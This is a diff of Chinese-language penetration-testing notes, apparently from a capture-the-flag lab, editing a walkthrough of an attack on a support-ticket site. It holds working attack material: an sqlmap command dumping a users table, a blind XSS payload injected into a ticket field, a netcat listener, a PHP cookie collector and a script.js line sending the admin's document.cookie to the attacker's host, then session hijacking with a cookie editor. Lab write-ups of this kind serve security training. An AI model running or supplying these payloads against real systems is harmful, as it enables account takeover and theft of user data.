@@ -114,7 +114,8 @@ sqlmap -r sqli.txt --dbms=mysql --dump -D status -T users --batch      dump 拉�
 在 Message 字段中包含以下内容，并提交工单
   "><script src=http://10.10.14.15:9000/TESTING_THIS></script>            盲注跨站脚本 (Blind Cross-Site Scripting, XSS)
 nc -lvnp 9000      提交前监听
-创建 ndex.php
+实例
+创建 index.php            decode 穿过来的 cookie      3
     <?php
   if (isset($_GET['c'])) {
       $list = explode(";", $_GET['c']);
@@ -126,11 +127,11 @@ nc -lvnp 9000      提交前监听
       }
   }
   ?>
-创建 script.js
-  new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie
+创建 script.js            redirect the request to the index.php
+  new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie            创建一个图片，但是传递了管理员的 cookie      2
 sudo php -S 0.0.0.0:9200      启动 php 网页服务
 在 Message 字段中包含以下内容，并提交工单
-  "><script src=http://10.10.14.15:9200/script.js></script>
+  "><script src=http://10.10.14.15:9200/script.js></script>        通过 php 网页服务，访问攻击机上的 script.js      1
 用像 Cookie-Editor 的 Firefox 插件，使用管理员的会话 cookie 登录
   https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search
 
